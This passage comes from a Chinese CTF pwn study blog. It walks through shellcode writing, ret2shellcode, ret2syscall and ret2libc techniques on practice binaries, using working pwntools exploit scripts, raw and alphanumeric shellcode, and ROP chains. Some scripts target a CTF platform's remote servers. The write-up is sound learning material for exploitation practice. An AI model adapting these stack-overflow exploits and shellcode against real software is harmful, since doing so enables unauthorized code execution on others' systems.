class="number">0x3b</span> */</span><br><span class="line">        pop rax</span><br><span class="line">        syscall</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>shellcode</span><br><span class="line"><span class="string">b&#x27;jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(shellcode)</span><br><span class="line"><span class="number">48</span> (<span class="number">0x30</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="shellcode精简版"><a href="#shellcode精简版" class="headerlink" title="shellcode精简版"></a>shellcode精简版</h4><p>转自<a href="https://www.codenong.com/cs110936441/">linux环境下shellcode的编写：32位和64位 | 码农家园 (codenong.com)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#########################################################################</span><br><span class="line">## 一般函数调用参数是压入栈中，这里系统调用使用寄存器</span><br><span class="line">## 需要对如下几个寄存器进行设置，可以比对官方的实现</span><br><span class="line"></span><br><span class="line">  ebx = /bin/sh     ## 第一个参数</span><br><span class="line">  ecx = 0             ## 第二个参数</span><br><span class="line">  edx = 0             ## 第三个参数</span><br><span class="line">  eax = 0xb           ## 0xb为系统调用号，即sys_execve()系统函数对应的序号</span><br><span class="line">  int 0x80            ## 执行系统中断</span><br><span class="line">#########################################################################</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    push 0x68732f        </span><br><span class="line">    push 0x6e69622f      </span><br><span class="line">    mov ebx, esp</span><br><span class="line">    xor edx, edx</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    mov al, 0xb       </span><br><span class="line">    int 0x80</span><br><span class="line">    ## 汇编之后字节长度为20字节</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> ######################################################################</span><br><span class="line">## 64位linux下，默认前6个参数都存入寄存器，所以这里没的说也使用寄存器</span><br><span class="line">## 寄存器存储参数顺序，参数从左到右：rdi, rsi, rdx, rcx, r8, r9</span><br><span class="line"></span><br><span class="line">    rdi = /bin/sh        ## 第一个参数</span><br><span class="line">    rsi = 0              ## 第二个参数</span><br><span class="line">    rdx = 0              ## 第三个参数</span><br><span class="line">    rax = 0x3b           ## 64位下的系统调用号</span><br><span class="line">    syscall              ## 64位使用 syscall</span><br><span class="line">#####################################################################</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mov rbx, 0x68732f6e69622f  </span><br><span class="line">    push rbx</span><br><span class="line">    push rsp</span><br><span class="line">    pop rdi</span><br><span class="line">    xor esi, esi             </span><br><span class="line">    xor edx, edx               </span><br><span class="line">    push 0x3b</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">    ## 汇编之后字节长度为22字节</span><br></pre></td></tr></table></figure><p><img src="../../img/image-20231205211551683.png" alt="image-20231205211551683"></p><p>无任何保护，有栈溢出漏洞，但是没有system(“/bin/sh”)类型的函数，因此需要我们在bss段构造一个shell函数</p><p><img src="../../img/image-20231205211744904.png" alt="image-20231205211744904"></p><p><img src="../../img/image-20231205212113245.png" alt="image-20231205212113245"></p><p><img src="../../img/image-20231205214725186.png" alt="image-20231205214725186"></p><p>buf2被存放在bss段，bss 是英文 Block by Symbol 的简称。通常用来存放程序中未初始化和初始化为 0的全局变量的一块内存区域</p><p><img src="../../img/image-20231205214701101.png" alt="image-20231205214701101"></p><p><code>0x0804A080</code>在第三行的范围      发现可读可写，达成<code>ret2shellcode</code>条件</p><p>生成字符串确定字符串<code>s</code>到<code>ebp</code>的距离</p><p><img src="../../img/image-20231205215121126.png" alt="image-20231205215121126"></p><p><img src="../../img/image-20231205215533022.png" alt="image-20231205215533022"></p><p>为<code>112（0x6c）</code></p><p>payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh()) <span class="comment">#生成一个用于打开 shell 的 shellcode，并通过 asm 函数将其转换为二进制形式。</span></span><br><span class="line">buf2_addr = <span class="number">0x0804A080</span> </span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>,<span class="string">b&#x27;A&#x27;</span>)+ p32(buf2_addr))</span><br><span class="line"><span class="comment">#shellcode.ljust(112, b&#x27;A&#x27;)：这是一个长度为 112 字节的字符串，通过在 shellcode 右侧填充字符 &#x27;A&#x27; 来确保达到指定的长度。</span></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于bss段在ubuntu22和ubuntu20设置为不可执行，我们只能在之前的版本（我用的是ubuntu16）运行payload</p><p><img src="../../img/image-20231211140320550.png" alt="image-20231211140320550"></p><h4 id="mrctf2020-shellcode1"><a href="#mrctf2020-shellcode1" class="headerlink" title="mrctf2020_shellcode1"></a>mrctf2020_shellcode1</h4><p><img src="../../img/image-20231218134827625.png" alt="image-20231218134827625"></p><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./mrctf2020_shellcode&#x27;</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="ciscn-2019-s-9"><a href="#ciscn-2019-s-9" class="headerlink" title="ciscn_2019_s_9"></a>ciscn_2019_s_9</h4><p><img src="../../img/image-20231218160423512.png" alt="image-20231218160423512"></p><p><img src="../../img/image-20231218170827303.png" alt="image-20231218170827303"></p><p><img src="../../img/image-20231218161031569.png" alt="image-20231218161031569"></p><p>可以看到<code>未开启NX保护</code>,我们难以确定shellcode在栈中的位置，可以借助<code>hint</code>函数，<code>jmp esp(跳板指令)</code>来跳转到栈上执行，但是由于<code>shellcraft()</code>生成的shellcode过长(0x2c),越过了函数的返回地址。当时我想在<code>跳转到esp</code>后拼接<code>shellcode</code>，但是失败了，原因在于<code>fgets()</code>限制了输入的长度。</p><p><img src="../../img/image-20231218194301225.png" alt="image-20231218194301225"></p><p><img src="../../img/image-20231218170813121.png" alt="image-20231218170813121"></p><p>我们只能自己构造较短的shellcode（）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_s_9&#x27;</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.sh())</span></span><br><span class="line">hint_addr=<span class="number">0x08048554</span></span><br><span class="line"><span class="comment">#payload = b&#x27;A&#x27;*0x24+p32(hint_addr)+shellcode</span></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push 0x68732f        </span></span><br><span class="line"><span class="string">    push 0x6e69622f      </span></span><br><span class="line"><span class="string">    mov ebx, esp</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    xor ecx, ecx</span></span><br><span class="line"><span class="string">    mov al,0xb          </span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line">shell = <span class="string">&#x27;&#x27;&#x27;sub esp,0x28;call esp&#x27;&#x27;&#x27;</span></span><br><span class="line">shell = asm(shell)</span><br><span class="line">payload = shellcode.ljust(<span class="number">0x24</span>,<span class="string">b&#x27;\x90&#x27;</span>)+p32(hint_addr)+shell</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a>pwnable_orw</h4><p>开启了沙箱保护</p><p><img src="../../img/image-20231219200625685.png" alt="image-20231219200625685"></p><p>可以看到开启了<code>沙箱保护</code>，这里沙箱保护会限制我们可以执行的系统调用。从汇编代码中我们可以看到执行了注入的<code>shellcode</code>，可以被执行的系统调用如下。</p><p><img src="../../img/image-20231219204403313.png" alt="image-20231219204403313"></p><p>可以用汇编实现<img src="../../img/image-20231219223531623.png" alt="image-20231219223531623"></p><p>payload1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29831</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys_open = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx;</span></span><br><span class="line"><span class="string">mov eax,0x5;</span></span><br><span class="line"><span class="string">push ecx;#&#x27;/0&#x27;截断字符</span></span><br><span class="line"><span class="string">push 0x67616c66;#flag</span></span><br><span class="line"><span class="string">mov ebx,esp;</span></span><br><span class="line"><span class="string">xor edx,edx;#将 edx 寄存器清零，表示在打开文件时不设置权限（mode）</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sys_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov eax,0x3;</span></span><br><span class="line"><span class="string">mov ecx,0x0804A127;    #shellcod最后字节向前覆盖</span></span><br><span class="line"><span class="string">mov ebx,0x3;#fd=3</span></span><br><span class="line"><span class="string">mov dl,0x40;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sys_write = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov eax,0x4;</span></span><br><span class="line"><span class="string">mov bl,0x1;    #fd=1</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=asm(sys_open)+asm(sys_read)+asm(sys_write)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Give my your shellcode:&quot;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./orw&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,<span class="number">0x0804A127</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="number">0x0804A127</span>,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>fd</th><th></th></tr></thead><tbody><tr><td>0</td><td>stdin</td></tr><tr><td>1</td><td>stdout</td></tr><tr><td>2</td><td>stderr</td></tr></tbody></table></div><p>注意本题的环境为<code>ubuntu16</code>，<code>bss段</code>是可执行的，较高版本的则不行。</p><h4 id="mrctf2020-shellcode-revenge"><a href="#mrctf2020-shellcode-revenge" class="headerlink" title="mrctf2020_shellcode_revenge"></a>mrctf2020_shellcode_revenge</h4><p>限制了输入字符<img src="../../img/image-20231220185502889.png" alt="image-20231220185502889"></p><p>可以使用<code>alpha3</code>来生成shellcode</p><blockquote><p>python ./ALPHA3.py x64 ascii mixedcase rax —input=”存储shellcode的文件”</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = process(&#x27;./mrctf2020_shellcode_revenge&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29257</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#r.recvuntil(&quot;Show me your magic!\n&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode_64=<span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line">payload=shellcode_64</span><br><span class="line"></span><br><span class="line">r.send(payload)  <span class="comment">#回车不在合法范围内</span></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="jarvisoj——level1"><a href="#jarvisoj——level1" class="headerlink" title="jarvisoj——level1"></a>jarvisoj——level1</h4><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p><img src="../../img/image-20231205222704106.png" alt="image-20231205222704106"></p><p><img src="../../img/image-20231206224304713.png" alt="image-20231206224304713"></p><p><img src="../../img/image-20231206224403111.png" alt="image-20231206224403111"></p><p>ida字符串搜索发现<code>/bin/sh</code>系统调用，地址为<code>0x80be408需要工具</code>ROPgadget`</p><p><img src="../../img/image-20231229134025593.png" alt="image-20231229134025593"></p><h5 id="找出修改的寄存器"><a href="#找出修改的寄存器" class="headerlink" title="找出修改的寄存器"></a>找出修改的寄存器</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br></pre></td></tr></table></figure><p><img src="../../img/image-20231206223432914.png" alt="image-20231206223432914"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br></pre></td></tr></table></figure><p><img src="../../img/image-20231206224119824.png" alt="image-20231206224119824"></p><p><img src="../../img/image-20231208201354573.png" alt="image-20231208201354573"></p><p>构建rop链，其中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="../../img/image-20231208203302563.png" alt="image-20231208203302563"></p><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p><a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#A1uGv">Basic-ROP (yuque.com)</a></p><p><a href="https://blog.csdn.net/ATFWUS/article/details/104565483">ROP-基础-ret2libc2_ret2libc2下载-CSDN博客</a></p><h4 id="过程链接表（PLT）和全局偏移量表（GOT）"><a href="#过程链接表（PLT）和全局偏移量表（GOT）" class="headerlink" title="过程链接表（PLT）和全局偏移量表（GOT）"></a>过程链接表（PLT）和全局偏移量表（GOT）</h4><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。</p><p><img src="../../img/image-20231207230527415.png" alt="image-20231207230527415"></p><p>总结一下，假设我们用调用<code>addvec</code>函数，首先进入PLT[2]。若为第<code>1</code>次调用，进行动态链接，然后把控制传递给addvec。第<code>n（n&gt;1)</code>调用由于<code>addvec</code>函数已经被加载到内存中确定的位置，则会从直接从PLT表跳转到GOT表中，在GOT表中进行函数调用。<br/></p><p><code>.got.plt</code>表用来表示<code>函数地址</code></p><p> 由于libc 的延迟绑定机制，我们需要泄露已经执行过的函数地址。</p><p><code>plt</code>在代码段，<code>got</code>在数据段</p><p><code>plt</code>是代码的填写者，<code>got</code>是代码的保存者</p><h4 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h4><blockquote><p>“/bin/sh”字符串和system函数都可以在程序找到</p></blockquote><p>通过IDAPro使用快捷键<code>ctrl+s</code>查找plt表上的system函数</p><p><img src="../../img/image-20231207232712108.png" alt="image-20231207232712108"></p><p>查找<code>/bin/sh</code></p><p><img src="../../img/image-20231208202603286.png" alt="image-20231208202603286"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line"><span class="comment">#elf=ELF(&quot;./ret2libc1&quot;)</span></span><br><span class="line"><span class="comment">#system_plt=elf.plt[&quot;system&quot;]</span></span><br><span class="line"><span class="comment">#binsh_addr=next(elf.Search(b&quot;/bin/sh&quot;))</span></span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x8048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>​        </p><h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h3><blockquote><p>找不到”/bin/sh”字符串</p></blockquote><p>两种wp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">sh=process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">sys_addr=<span class="number">0x08048490</span></span><br><span class="line">gets_addr=<span class="number">0x08048460</span></span><br><span class="line">buf2_addr=<span class="number">0x0804A080</span></span><br><span class="line"><span class="comment">#buf2_addr=elf.symbols[&quot;buf2&quot;]</span></span><br><span class="line">payload=flat([<span class="number">112</span>*<span class="string">b&#x27;a&#x27;</span>,gets_addr,sys_addr,buf2_addr,buf2_addr])</span><br><span class="line"><span class="comment">#gets地址</span></span><br><span class="line"><span class="comment">#system地址（也是gets的返回地址）</span></span><br><span class="line"><span class="comment">#buf2（是gets的参数）</span></span><br><span class="line"><span class="comment">#buf2（是system的参数）</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line">                                                                                                   </span><br></pre></td></tr></table></figure><p>此处的<code>ebx</code>用于调整栈结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">sh=process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">sys_addr=<span class="number">0x08048490</span></span><br><span class="line">gets_addr=<span class="number">0x08048460</span></span><br><span class="line">buf2_addr=<span class="number">0x0804A080</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x0804843d</span></span><br><span class="line">payload=flat([<span class="number">112</span>*<span class="string">b&#x27;a&#x27;</span>,gets_addr,pop_ebx_addr,buf2_addr,sys_addr,<span class="string">&#x27;AAAA&#x27;</span>,buf2_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h4><blockquote><p>都找不到</p></blockquote><p>泄露libc地址，通过偏移计算出字符串地址</p><p>_start函数有一句and esp, 0FFFFFFF0h进行了堆栈平衡</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">#main_addr = 0x080484D0</span><br><span class="line">start_addr = 0x08048618</span><br><span class="line">put_plt = 0x08048460</span><br><span class="line">libc_main_addr = 0x0804A024</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = 112 * b&#x27;a&#x27; + p32(put_plt) + p32(start_addr) + p32(libc_main_addr)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_real_addr = u32(sh.recv(4))</span><br><span class="line"></span><br><span class="line">print (&quot;real_addr is:&quot; + hex(libc_real_addr))</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">addr_base = libc_real_addr - 0x018540</span><br><span class="line"></span><br><span class="line">system_addr = addr_base + 0x03a940</span><br><span class="line">string_addr = addr_base + 0x15902b</span><br><span class="line"></span><br><span class="line">print (&quot;system addr is:&quot; + hex(system_addr))</span><br><span class="line">print (&quot;string_addr is:&quot; + hex(string_addr))</span><br><span class="line"></span><br><span class="line">payload = 104 * b&#x27;a&#x27; + p32(system_addr) + 4*b&#x27;a&#x27; + p32(string_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://drops.xmd5.com/static/drops/tips-6597.html">一步一步学ROP之linux_x86篇 | WooYun知识库 (xmd5.com)</a>    </p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2syscall">基本 ROP - CTF Wiki (ctf-wiki.org)</a></p><p><a href="https://zhuanlan.zhihu.com/p/137144976">基本ROP讲解 - 知乎 (zhihu.com)</a></p><p><a href="https://www.jianshu.com/p/5092d6d5caa3">彻底搞清楚 GOT 和 PLT - 简书 (jianshu.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红帽杯easyre</title>
      <link href="/2023/12/19/buuctf_re_WP/%E7%BA%A2%E5%B8%BD%E6%9D%AFeasyRe/"/>
      <url>/2023/12/19/buuctf_re_WP/%E7%BA%A2%E5%B8%BD%E6%9D%AFeasyRe/</url>
      
